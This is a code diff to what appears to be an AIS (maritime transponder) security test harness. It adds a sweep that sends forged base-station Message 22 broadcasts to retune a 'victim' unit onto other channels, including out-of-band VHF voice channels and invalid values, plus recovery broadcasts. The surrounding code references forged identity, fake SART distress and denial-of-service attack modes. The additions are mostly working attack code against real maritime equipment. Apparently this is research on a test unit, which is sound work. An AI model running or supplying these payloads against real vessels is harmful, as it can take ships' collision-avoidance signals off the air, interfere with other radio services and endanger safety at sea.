@@ -707,6 +707,62 @@ def build_chanmgmt(ctx):
 M20_TARGET_OFFSETS = [60, 420, 810, 1170, 1525, 1870]   # bracket a slow Class A's typical slots
 
 
+# Frequency sweep targets: which channel numbers does a unit accept? 2087/2088 are the default
+# AIS pair and 2084/2085 are near-band AIS alternates; the interesting cases are the ones OUTSIDE
+# the AIS band (a unit that retunes there would emit AIS on a channel used for other VHF services)
+# and the invalid/edge values (a well-formed unit should clamp/reject). Controls first, then
+# adjacent, then out-of-band, then invalid.
+SWEEP_TARGETS = [
+    (2088, "AIS2 162.025 -- control: legal target (no-op, stays visible)"),
+    (2087, "AIS1 161.975 -- control: legal target (no-op, stays visible)"),
+    (2086, "ch 86 ~161.925 -- adjacent, just below the AIS pair"),
+    (2078, "ch 78 -- near-band marine"),
+    (2028, "ch 28 -- upper marine band"),
+    (2001, "ch 1 ~156.05 -- OUT OF AIS BAND (port/voice)"),
+    (0,    "channel 0 -- invalid/edge (should be rejected)"),
+    (4095, "channel 4095 -- max 12-bit, invalid (should be rejected)"),
+]
+
+
+def build_chanmgmt_sweep(ctx):
+    """Frequency sweep: try to move the victim to each SWEEP_TARGETS channel via a broadcast
+    regional Msg 22 from a base, to find WHICH channels the unit accepts -- especially any OUTSIDE
+    the AIS band, where acceptance means the unit emits AIS on a channel used for other VHF
+    services. After each target a restore-to-default is sent, but that restore is only HEARD if the
+    unit REJECTED the target and stayed on the default channel. If a unit ACCEPTS a target it moves
+    and goes dark on the witness, and neither the next target nor its restore reaches it -- so a
+    genuine acceptance ends the useful sweep and needs manual recovery (front panel, or
+    --chanmgmt-recover with the simulator retuned to the accepted channel). Run this as its OWN
+    pass (--chanmgmt-sweep); it is destructive on a permissive unit, so it is not interleaved with
+    the observable on-channel tests in build_chanmgmt."""
+    vlat, vlon = ctx.victim_lat, ctx.victim_lon
+    m4 = (enc.encode_type4(BASE_MMSI, vlat + 0.2, vlon + 0.2, hour=12, minute=0, second=0),
+          "Msg4 base-station announcement")
+    cells = []
+    for chan, label in SWEEP_TARGETS:
+        cells.append((f"sweep_ch{chan}",
+            [m4, (_m22_regional(BASE_MMSI, vlat, vlon, chan, chan),
+                  f"M22 (base) regional retune to channel {chan} [{label}]")]))
+        cells.append((f"sweep_recover_ch{chan}",
+            [m4, (_m22_regional(BASE_MMSI, vlat, vlon, DEF_CH_A, DEF_CH_B, power=0),
+                  "restore default (heard ONLY if the target was rejected)")]))
+    return cells
+
+
+def build_chanmgmt_recover(ctx):
+    """Operator-driven recovery payloads: announce the base and restore the DEFAULT AIS channels
+    (high power, both-channel Tx/Rx) and clear any rate/group assignment. To reach a unit that has
+    already moved off-channel, run this (--chanmgmt-recover) with the ais-simulator retuned to the
+    channel the unit is STUCK on, so the command is transmitted where the unit is now listening."""
+    vlat, vlon = ctx.victim_lat, ctx.victim_lon
+    return [
+        enc.encode_type4(BASE_MMSI, vlat + 0.2, vlon + 0.2, hour=12, minute=0, second=0),
+        _m22_regional(BASE_MMSI, vlat, vlon, DEF_CH_A, DEF_CH_B, power=0, tx_rx=0),
+        _m23_group(BASE_MMSI, vlat, vlon, interval=0, quiet=0),
+        enc.encode_type16(BASE_MMSI, ctx.victim_mmsi, offset_a=20, increment_a=0),
+    ]
+
+
 def build_photo(ctx):
     """Photogenic attacks, each sustained for a couple of minutes so the display can be
     photographed. RF steps drive the transponder over the air (target contacts); the one serial
@@ -846,6 +902,15 @@ def main():
     ap.add_argument("--chanmgmt-postroll", type=float, default=90.0,
                     help="no-injection window after the suite to see whether the victim "
                          "returns to AIS1/AIS2 once the default channels are restored")
+    ap.add_argument("--chanmgmt-sweep", action="store_true",
+                    help="run ONLY the frequency sweep: try to retune the victim to a range of "
+                         "target channels (in-band controls, near-band, OUT-OF-AIS-BAND, and "
+                         "invalid) to find which it accepts. Destructive on a permissive unit; "
+                         "recover any accepted target with --chanmgmt-recover.")
+    ap.add_argument("--chanmgmt-recover", action="store_true",
+                    help="run ONLY the restore-to-default broadcast (default channels, high power, "
+                         "cleared rate/group). Retune the ais-simulator to the channel the unit is "
+                         "STUCK on before running this so the command reaches it.")
     ap.add_argument("--photo", choices=["impossible_speed", "forged_identity",
                                         "sart_distress", "dos_noposition"],
                     help="play ONE photogenic attack in an infinite loop (Ctrl-C to stop) so the "
@@ -886,7 +951,7 @@ def main():
     ctx = Ctx(args.victim_mmsi, gps)
     timeline = build_timeline(ctx)
     if (args.phase2_only or args.phase3_only or args.extras_only or args.chanmgmt_only
-            or args.photo):
+            or args.chanmgmt_sweep or args.chanmgmt_recover or args.photo):
         timeline = []
     if args.only:
         timeline = [(n, p) for (n, p) in timeline if n in args.only]
@@ -1077,8 +1142,62 @@ def main():
             print("  CHANMGMT DONE -- stop the RF and serial recorders now.")
             print("  RECOVERY: if the unit is still OFF AIS1/AIS2, a restore sent on the default")
             print("  channel cannot reach it. Clear its regional/channel settings from the MKD")
-            print(f"  front panel, or transmit the restore on the alt channels {ALT_CH_A}/{ALT_CH_B}.")
+            print(f"  front panel, or retune the ais-simulator to {ALT_CH_A}/{ALT_CH_B} and run")
+            print("  rf_session.py --chanmgmt-recover to send the restore on that channel.")
             print("!" * 72)
+
+        # ---- frequency sweep (--chanmgmt-sweep): which channels does the unit accept? ----
+        if args.chanmgmt_sweep:
+            sw = build_chanmgmt_sweep(ctx)
+            print("\n" + "=" * 72)
+            print("  FREQUENCY SWEEP. Recorder on AB. WARNING: if the unit ACCEPTS a target it")
+            print("  moves off-channel and every later step (and its restore) is unheard, so a")
+            print("  real acceptance ends the useful sweep. Recover with --chanmgmt-recover (the")
+            print("  simulator retuned to the accepted channel) or the front panel.")
+            print("=" * 72)
+            rec(event="chanmgmt_sweep_start", n=len(sw),
+                targets=[c for c, _ in SWEEP_TARGETS], def_ch=(DEF_CH_A, DEF_CH_B))
+            for i, (name, payloads) in enumerate(sw):
+                fire(name, payloads, i, len(sw), tag="SWEEP:",
+                     extra={"command": "M22", "source": "base",
+                            "target_ch": None if name.startswith("sweep_recover_")
+                                         else int(name[len("sweep_ch"):])})
+                if i < len(sw) - 1:
+                    dwell = 6 if name.startswith("sweep_recover_") else args.chanmgmt_gap
+                    print(f"    ...{dwell:.0f}s dwell (watch the witness: did the victim leave AB?)...")
+                    time.sleep(dwell)
+            print("    final recovery: restore-to-default on the default channel (x3)")
+            for _ in range(3):
+                ws.send(_m22_regional(BASE_MMSI, ctx.victim_lat, ctx.victim_lon,
+                                      DEF_CH_A, DEF_CH_B, power=0))
+                rec(event="final_recovery", meta="restore default after sweep")
+                time.sleep(1)
+            print("\n" + "!" * 72)
+            print("  SWEEP DONE. If the unit is off-channel, retune the simulator to the accepted")
+            print("  channel and run rf_session.py --chanmgmt-recover, or use the MKD front panel.")
+            print("!" * 72)
+
+        # ---- operator-driven recovery (--chanmgmt-recover): run with the simulator on the
+        #      channel the unit is STUCK on so the restore actually reaches it ----
+        if args.chanmgmt_recover:
+            payloads = build_chanmgmt_recover(ctx)
+            secs = max(60.0, args.chanmgmt_postroll)
+            print("\n" + "=" * 72)
+            print("  CHANMGMT RECOVER. Broadcasting restore-to-default (channels + power + rate +")
+            print("  group cleared). This only works if the ais-simulator is transmitting on the")
+            print("  channel the unit is CURRENTLY on -- retune the simulator there first.")
+            print("=" * 72)
+            rec(event="chanmgmt_recover_start", seconds=secs)
+            end = time.time() + secs; r = 0
+            while time.time() < end:
+                for bits in payloads:
+                    if all(c in "01" for c in bits):
+                        ws.send(bits)
+                rec(event="recover_sent", rep=r); r += 1
+                print(f"      -> restore burst {r} (Ctrl-C to stop)")
+                time.sleep(2)
+            rec(event="chanmgmt_recover_end")
+            print("    recover done. Check the witness / MKD for return to AIS1/AIS2.")
 
         # ---- phase 2: aggressive tests, larger gaps, severity-ordered ----
         if args.phase2 or args.phase2_only:
